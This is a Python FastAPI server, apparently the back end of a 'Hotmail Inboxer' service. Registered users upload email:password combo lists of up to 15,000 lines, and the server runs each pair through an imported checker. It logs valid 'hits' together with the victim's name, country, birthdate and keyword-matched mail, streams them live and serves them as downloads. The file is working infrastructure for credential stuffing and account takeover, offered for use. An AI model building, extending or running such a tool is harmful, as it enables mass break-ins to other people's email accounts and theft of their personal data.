from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
import asyncio
import threading
import os
import json
import signal
import sys
from datetime import datetime

from database import *
from auth import *
from checker import checker_worker_single

# ============================================================
# FASTAPI APP
# ============================================================
app = FastAPI(title="Hotmail Inboxer Multi-User")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

user_connections = {}
ws_lock = threading.Lock()

stop_flags = {}
stop_lock = threading.Lock()

# ============================================================
# STARTUP/SHUTDOWN EVENTS (ÚJ!)
# ============================================================
@app.on_event("startup")
async def startup_cleanup():
    """
    Server induláskor lezárja az összes 'running' státuszú futtatást.
    Ez javítja a MongoDB-ben ragadt futtatásokat.
    """
    print("\n🔧 Startup cleanup...")
    
    # Összes 'running' státuszú run lekérése
    from pymongo import MongoClient
    client = MongoClient(os.getenv("MONGODB_URL"))
    db = client.hotmail_checker
    
    running_runs = db.runs.find({"status": "running"})
    count = 0
    
    for run in running_runs:
        # Lezárjuk őket (status: finished)
        db.runs.update_one(
            {"_id": run["_id"]},
            {"$set": {
                "status": "finished",
                "finished_at": datetime.utcnow()
            }}
        )
        count += 1
    
    if count > 0:
        print(f"✅ {count} ragadt futtatás lezárva MongoDB-ben")
    else:
        print("✅ Nincs ragadt futtatás")
    
    client.close()

@app.on_event("shutdown")
async def shutdown_cleanup():
    """
    Server leállításkor lezárja az összes futó checkert.
    """
    print("\n🛑 Shutdown cleanup...")
    
    # Stop jelzés minden futó checkernek
    with stop_lock:
        for user_id in list(stop_flags.keys()):
            stop_flags[user_id].set()
    
    # Várunk 2 másodpercet, hogy a szálak lezáródjanak
    await asyncio.sleep(2)
    
    # MongoDB-ben lezárjuk az összes running-ot
    from pymongo import MongoClient
    client = MongoClient(os.getenv("MONGODB_URL"))
    db = client.hotmail_checker
    
    db.runs.update_many(
        {"status": "running"},
        {"$set": {
            "status": "finished",
            "finished_at": datetime.utcnow()
        }}
    )
    
    print("✅ Minden futtatás lezárva")
    client.close()

# ============================================================
# WEBSOCKET BROADCAST
# ============================================================
def broadcast_to_user(user_id: str, message: str):
    with ws_lock:
        if user_id not in user_connections:
            return
        dead = []
        for ws_info in user_connections[user_id]:
            try:
                asyncio.run_coroutine_threadsafe(
                    ws_info["ws"].send_text(message), ws_info["loop"]
                )
            except:
                dead.append(ws_info)
        for d in dead:
            user_connections[user_id].remove(d)
        if not user_connections[user_id]:
            del user_connections[user_id]

# ============================================================
# AUTH ROUTES
# ============================================================
@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    return templates.TemplateResponse("register.html", {"request": request})

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

# ============================================================
# AUTH API
# ============================================================
@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...)):
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="A jelszónak legalább 6 karakter hosszúnak kell lennie")
    existing = await get_user_by_email(email)
    if existing:
        raise HTTPException(status_code=400, detail="Ez az email már regisztrálva van")
    hashed_pw = hash_password(password)
    await create_user(email, hashed_pw)
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó")
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.get("/api/me")
async def get_me(current_user = Depends(get_current_user)):
    return {"email": current_user["email"], "created_at": current_user["created_at"].isoformat()}

# ============================================================
# CHECKER ROUTES
# ============================================================
@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    speed: float = Form(0.3),
    current_user = Depends(get_current_user)
):
    active = await get_active_run(str(current_user["_id"]))
    if active:
        raise HTTPException(status_code=400, detail="Már fut egy checker!")
    
    if speed < 0.05:
        speed = 0.05
    elif speed > 5.0:
        speed = 5.0
    
    content = await file.read()
    combo_text = content.decode("utf-8", errors="ignore")
    lines = [l.strip() for l in combo_text.splitlines() if ':' in l and '@' in l and l.count(':') == 1]
    
    if not lines:
        raise HTTPException(status_code=400, detail="Nincs érvényes combo")
    if len(lines) > 15000:
        raise HTTPException(status_code=400, detail="Max 15000 account")
    
    run_id = await create_run(str(current_user["_id"]), keyword, len(lines))
    user_id = str(current_user["_id"])
    
    with stop_lock:
        stop_flags[user_id] = asyncio.Event()
    
    threading.Thread(
        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, speed)),
        daemon=True
    ).start()
    
    return {"run_id": run_id, "total": len(lines), "speed": speed}

@app.post("/api/stop")
async def stop_checker(current_user = Depends(get_current_user)):
    user_id = str(current_user["_id"])
    
    with stop_lock:
        if user_id in stop_flags:
            stop_flags[user_id].set()
            return {"status": "stopping", "message": "Checker leállítás folyamatban..."}
    
    raise HTTPException(status_code=404, detail="Nincs futó checker")

async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "info",
        "text": f"[START] {total} fiók | Keyword: {keyword} | Sebesség: {speed}s"
    }))
    
    for line in lines:
        with stop_lock:
            if user_id in stop_flags and stop_flags[user_id].is_set():
                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "info",
                    "text": f"[LEÁLLÍTVA] ({checked}/{total})"
                }))
                await finish_run(run_id)
                broadcast_to_user(user_id, json.dumps({"type": "stopped"}))
                with stop_lock:
                    if user_id in stop_flags:
                        del stop_flags[user_id]
                return
        
        if ':' not in line or '@' not in line:
            continue
        
        try:
            email, password = line.split(':', 1)
        except:
            continue
        
        result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
        checked += 1
        
        if result["status"] == "hit":
            hits += 1
            data = result["data"]
            line_text = f"{data['email']}:{data['password']} | Country={data['country']} | Name={data['name']} | Birthdate={data['birthdate']} | Date={data['date']} | Mails={data['mails']}"
            await add_result_to_run(run_id, "hit", line_text)
            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {line_text}"}))
            broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": data}))
            
        elif result["status"] == "custom":
            custom += 1
            data = result["data"]
            line_text = f"{data['email']}:{data['password']} | Country={data['country']} | Name={data['name']} | Birthdate={data['birthdate']}"
            await add_result_to_run(run_id, "custom", line_text)
            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {line_text}"}))
            broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": data}))
            
        elif result["status"] == "bad":
            bad += 1
            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
        else:
            retries += 1
        
        await update_run_stats(run_id, {
            "checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries
        })
        
        broadcast_to_user(user_id, json.dumps({
            "type": "stats", "run_id": run_id,
            "checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries, "total": total
        }))
        
        await asyncio.sleep(speed)
    
    await finish_run(run_id)
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "finish",
        "text": f"[KÉSZ] Hits: {hits} | Custom: {custom} | Bad: {bad}"
    }))
    broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
    
    with stop_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]

# ============================================================
# OTHER API
# ============================================================
@app.get("/api/runs")
async def get_runs(current_user = Depends(get_current_user)):
    runs = await get_user_runs(str(current_user["_id"]))
    for r in runs:
        r["_id"] = str(r["_id"])
        r["started_at"] = r["started_at"].isoformat()
        if r.get("finished_at"):
            r["finished_at"] = r["finished_at"].isoformat()
    return runs

@app.get("/api/run/{run_id}")
async def get_run_detail(run_id: str, current_user = Depends(get_current_user)):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404)
    run["_id"] = str(run["_id"])
    run["started_at"] = run["started_at"].isoformat()
    if run.get("finished_at"):
        run["finished_at"] = run["finished_at"].isoformat()
    return run

@app.get("/api/download/{run_id}/{type}")
async def download(run_id: str, type: str, current_user = Depends(get_current_user)):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404)
    
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    filename = f"Hotmail-{'Hits' if type == 'hits' else 'Custom'}-{run_id}.txt"
    
    return PlainTextResponse(
        content="\n".join(lines) if lines else "Nincs eredmény",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )

# ============================================================
# WEBSOCKET
# ============================================================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    
    email = decode_token(token)
    if not email:
        await websocket.close(code=1008)
        return
    
    user = await get_user_by_email(email)
    if not user:
        await websocket.close(code=1008)
        return
    
    user_id = str(user["_id"])
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)
    
    # Aktív run NEM küldjük el (mert startup-nál lezártuk)
    # Ha mégis running van, az valós futtatás
    active_run = await get_active_run(user_id)
    if active_run:
        active_run["_id"] = str(active_run["_id"])
        active_run["started_at"] = active_run["started_at"].isoformat()
        await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
    
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        with ws_lock:
            if user_id in user_connections and ws_info in user_connections[user_id]:
                user_connections[user_id].remove(ws_info)
                if not user_connections[user_id]:
                    del user_connections[user_id]

# ============================================================
# GRACEFUL SHUTDOWN HANDLER (ÚJ!)
# ============================================================
def signal_handler(sig, frame):
    """SIGTERM/SIGINT kezelő (Render.com deploy esetén)"""
    print("\n🛑 Signal received, shutting down gracefully...")
    
    # Stop jelzés minden checkernek
    with stop_lock:
        for user_id in list(stop_flags.keys()):
            stop_flags[user_id].set()
    
    # MongoDB cleanup
    from pymongo import MongoClient
    client = MongoClient(os.getenv("MONGODB_URL"))
    db = client.hotmail_checker
    db.runs.update_many(
        {"status": "running"},
        {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
    )
    client.close()
    
    print("✅ Cleanup done, exiting...")
    sys.exit(0)

# Signal handler regisztrálása
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================================
# INDÍTÁS
# ============================================================
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    
    print("\n" + "="*60)
    print("  🚀 Hotmail Inboxer - Multi-User v3.1")
    print(f"  📡 http://0.0.0.0:{port}")
    print(f"  ⚡ MongoDB Cleanup: ENABLED")
    print("="*60 + "\n")
    
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
